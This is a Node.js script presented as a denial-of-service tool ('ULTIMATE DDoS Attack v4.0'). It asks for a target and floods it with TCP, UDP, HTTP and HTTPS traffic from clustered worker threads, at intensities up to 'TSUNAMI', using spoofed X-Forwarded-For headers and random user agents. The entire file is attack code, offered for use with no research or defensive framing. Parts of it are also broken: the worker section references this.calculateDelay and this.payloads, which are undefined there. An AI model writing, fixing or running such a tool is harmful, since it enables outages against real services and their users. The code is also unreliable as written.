#!/usr/bin/env node
'use strict';

const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const net = require('net');
const dgram = require('dgram');
const crypto = require('crypto');
const readline = require('readline');
const dns = require('dns/promises');
const url = require('url');
const http = require('http');
const https = require('https');
const cluster = require('cluster');
const os = require('os');

const colors = {
    title: "\x1b[1;33m", 
    prompt: "\x1b[1;32m",
    error: "\x1b[1;31m",
    success: "\x1b[1;92m",
    warning: "\x1b[1;93m",
    info: "\x1b[1;96m",
    stat: "\x1b[1;97m",
    highlight: "\x1b[1;95m",
    debug: "\x1b[90m",
    reset: "\x1b[0m"
};

class UltimateDDoSAttack {
    constructor() {
        this.stats = {
            total: 0,
            success: 0,
            failed: 0,
            bandwidth: 0,
            methods: { TCP: 0, UDP: 0, HTTP: 0, HTTPS: 0 }
        };
        this.workers = [];
        this.methods = ['TCP', 'UDP', 'HTTP', 'HTTPS'];
        this.startTime = Date.now();
        this.statsInterval = null;
        this.payloads = this.generatePayloads();
    }

    generatePayloads() {
        return {
            TCP: crypto.randomBytes(4096),
            UDP: crypto.randomBytes(65507),
            HTTP: this.generateHttpRequest(),
            HTTPS: this.generateHttpRequest(true)
        };
    }

    generateHttpRequest(secure = false) {
        const methods = secure ? ['GET', 'POST'] : ['GET', 'POST', 'HEAD'];
        const paths = ['/', '/wp-login.php', '/api/v1/users', '/graphql', '/admin'];
        const userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15',
            'curl/8.2.1'
        ];

        const randomMethod = methods[Math.floor(Math.random() * methods.length)];
        const randomPath = paths[Math.floor(Math.random() * paths.length)];
        const randomUserAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
        const randomIP = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;

        return Buffer.from([
            `${randomMethod} ${randomPath}?${crypto.randomBytes(16).toString('hex')} HTTP/1.1`,
            `Host: ${workerData?.target || 'example.com'}`,
            `User-Agent: ${randomUserAgent}`,
            'Accept: */*',
            'Accept-Language: en-US,en;q=0.9',
            'Connection: keep-alive',
            'Cache-Control: no-cache',
            `X-Forwarded-For: ${randomIP}`,
            `X-Real-IP: ${randomIP}`,
            'Content-Length: 0',
            '\r\n'
        ].join('\r\n'));
    }

    async start() {
        console.log(`${colors.title}🔥 ULTIMATE DDoS Attack v4.0 🔥${colors.reset}\n`);
        
        const target = await this.ask(`${colors.prompt}Target (URL/IP): ${colors.reset}`);
        const { host, port, protocol } = await this.resolveTarget(target);
        const threads = await this.numberBetween(`${colors.prompt}Threads (100-20000): ${colors.reset}`, 100, 20000);
        const duration = await this.numberBetween(`${colors.prompt}Duration (seconds): ${colors.reset}`, 10, 86400);
        const intensity = await this.selectIntensity();

        console.log(`${colors.info}\n🔹 Target: ${host}:${port}${colors.reset}`);
        console.log(`${colors.info}🔹 Protocol: ${protocol.toUpperCase()}${colors.reset}`);
        console.log(`${colors.info}🔹 Threads: ${threads}${colors.reset}`);
        console.log(`${colors.info}🔹 Duration: ${duration} seconds${colors.reset}`);
        console.log(`${colors.info}🔹 Intensity: ${intensity}${colors.reset}`);

        this.startAttack(host, port, threads, intensity);
        this.showStats();
        setTimeout(() => this.stop(), duration * 1000);
    }

    async selectIntensity() {
        console.log(`\n${colors.info}Attack intensity:${colors.reset}`);
        console.log(`${colors.warning}1. Steady (low)${colors.reset}`);
        console.log(`${colors.warning}2. Aggressive (medium)${colors.reset}`);
        console.log(`${colors.warning}3. Flood (high)${colors.reset}`);
        console.log(`${colors.warning}4. TSUNAMI (max)${colors.reset}\n`);

        const choice = await this.numberBetween(`${colors.prompt}Choice (1-4): ${colors.reset}`, 1, 4);
        return ['Steady', 'Aggressive', 'Flood', 'TSUNAMI'][choice - 1];
    }

    startAttack(target, port, threads, intensity) {
        if (cluster.isMaster) {
            const cpuCount = Math.min(os.cpus().length, 32);
            for (let i = 0; i < cpuCount; i++) {
                cluster.fork();
            }

            cluster.on('exit', (worker) => {
                cluster.fork();
            });
        } else {
            const workerThreads = Math.ceil(threads / os.cpus().length);

            for (let i = 0; i < workerThreads; i++) {
                const method = this.methods[Math.floor(Math.random() * this.methods.length)];
                const worker = new Worker(__filename, { 
                    workerData: { 
                        target, 
                        port, 
                        method,
                        intensity
                    }
                });
                
                worker.on('message', (msg) => {
                    this.stats.total += msg.total || 0;
                    this.stats.success += msg.success || 0;
                    this.stats.failed += msg.failed || 0;
                    this.stats.bandwidth += msg.bandwidth || 0;
                    if (msg.method) this.stats.methods[msg.method]++;
                });
                
                this.workers.push(worker);
            }
        }
    }

    calculateDelay(intensity) {
        const delays = {
            'Steady': 100,
            'Aggressive': 20,
            'Flood': 3,
            'TSUNAMI': 0
        };
        return delays[intensity] || 20;
    }

    showStats() {
        const render = () => {
            const elapsed = (Date.now() - this.startTime) / 1000;
            const rps = elapsed > 0 ? (this.stats.total / elapsed).toFixed(0) : 0;
            const bw = (this.stats.bandwidth / (1024 ** 2)).toFixed(2);
            const successRate = this.stats.total > 0 
                ? ((this.stats.success / this.stats.total) * 100).toFixed(1) 
                : '0.0';

            readline.clearLine(process.stdout, 0);
            readline.cursorTo(process.stdout, 0);

            const statsDisplay = [
                `${colors.highlight}⏱️ ${elapsed.toFixed(1)}s${colors.reset}`,
                `${colors.stat}REQ:${colors.info} ${this.stats.total}${colors.reset}`,
                `${colors.stat}OK:${colors.success} ${this.stats.success}${colors.reset}`,
                `${colors.stat}FAIL:${colors.error} ${this.stats.failed}${colors.reset}`,
                `${colors.stat}RATE:${colors.warning} ${successRate}%${colors.reset}`,
                `${colors.stat}RPS:${colors.highlight} ${rps}${colors.reset}`,
                `${colors.stat}BW:${colors.info} ${bw}MB/s${colors.reset}`
            ].join(' | ');

            process.stdout.write(statsDisplay);
        };

        this.statsInterval = setInterval(render, 500);
        render();
    }

    async ask(question) {
        const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
        return new Promise(resolve => {
            rl.question(question, answer => {
                rl.close();
                resolve(answer.trim());
            });
        });
    }

    async numberBetween(question, min, max) {
        let num;
        do num = parseInt(await this.ask(question)) || min;
        while (num < min || num > max);
        return num;
    }

    async resolveTarget(input) {
        try {
            const parsed = new url.URL(input.includes('://') ? input : `http://${input}`);
            const resolved = await dns.lookup(parsed.hostname);
            return { 
                host: resolved.address, 
                port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
                protocol: parsed.protocol.replace(':', '')
            };
        } catch {
            console.log(`${colors.error}\nInvalid target!${colors.reset}`);
            process.exit(1);
        }
    }

    stop() {
        clearInterval(this.statsInterval);
        if (cluster.isMaster) {
            for (const id in cluster.workers) {
                cluster.workers[id].kill();
            }
        }
        this.workers.forEach(w => w.terminate());
        console.log(`${colors.success}\nAttack stopped${colors.reset}`);
        process.exit();
    }
}

if (!isMainThread) {
    const { target, port, method, intensity } = workerData;
    const delay = this.calculateDelay(intensity);

    const attackMethods = {
        TCP: () => {
            const socket = net.connect(port, target, () => {
                for (let i = 0; i < 10; i++) socket.write(this.payloads.TCP);
                socket.destroy();
                parentPort.postMessage({ 
                    total: 10, 
                    success: 1, 
                    failed: 0, 
                    bandwidth: this.payloads.TCP.length * 10,
                    method: 'TCP'
                });
            });
            
            socket.on('error', () => {
                parentPort.postMessage({ 
                    total: 10, 
                    success: 0, 
                    failed: 10, 
                    bandwidth: 0,
                    method: 'TCP'
                });
            });
        },
        UDP: () => {
            const socket = dgram.createSocket('udp4');
            for (let i = 0; i < 20; i++) {
                socket.send(this.payloads.UDP, port, target, () => {
                    parentPort.postMessage({ 
                        total: 1, 
                        success: 1, 
                        failed: 0, 
                        bandwidth: this.payloads.UDP.length,
                        method: 'UDP'
                    });
                });
            }
            setTimeout(() => socket.close(), 50);
        },
        HTTP: () => {
            const req = http.request({
                host: target,
                port: port,
                method: ['GET', 'POST'][Math.floor(Math.random() * 2)],
                path: `/?${crypto.randomBytes(16).toString('hex')}`,
                headers: {
                    'User-Agent': this.payloads.HTTP.toString().split('\r\n')[2].split(': ')[1],
                    'X-Forwarded-For': `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
                    'Accept': '*/*',
                    'Connection': 'keep-alive'
                }
            });
            
            req.on('response', () => {
                parentPort.postMessage({ 
                    total: 1, 
                    success: 1, 
                    failed: 0, 
                    bandwidth: this.payloads.HTTP.length,
                    method: 'HTTP'
                });
            });
            
            req.on('error', () => {
                parentPort.postMessage({ 
                    total: 1, 
                    success: 0, 
                    failed: 1, 
                    bandwidth: 0,
                    method: 'HTTP'
                });
            });
            
            req.end();
        },
        HTTPS: () => {
            const req = https.request({
                host: target,
                port: port,
                method: 'GET',
                path: `/?${crypto.randomBytes(16).toString('hex')}`,
                rejectUnauthorized: false,
                headers: {
                    'User-Agent': this.payloads.HTTPS.toString().split('\r\n')[2].split(': ')[1],
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Cache-Control': 'no-cache'
                }
            });
            
            req.on('response', () => {
                parentPort.postMessage({ 
                    total: 1, 
                    success: 1, 
                    failed: 0, 
                    bandwidth: this.payloads.HTTPS.length,
                    method: 'HTTPS'
                });
            });
            
            req.on('error', () => {
                parentPort.postMessage({ 
                    total: 1, 
                    success: 0, 
                    failed: 1, 
                    bandwidth: 0,
                    method: 'HTTPS'
                });
            });
            
            req.end();
        }
    };

    const attack = () => attackMethods[method]();
    
    if (intensity === 'TSUNAMI') {
        const attackWave = () => {
            for (let i = 0; i < 10; i++) attack();
        };
        setInterval(attackWave, 1);
    } else {
        setInterval(attack, delay);
    }
}

if (isMainThread && !cluster.isWorker) {
    new UltimateDDoSAttack().start();
}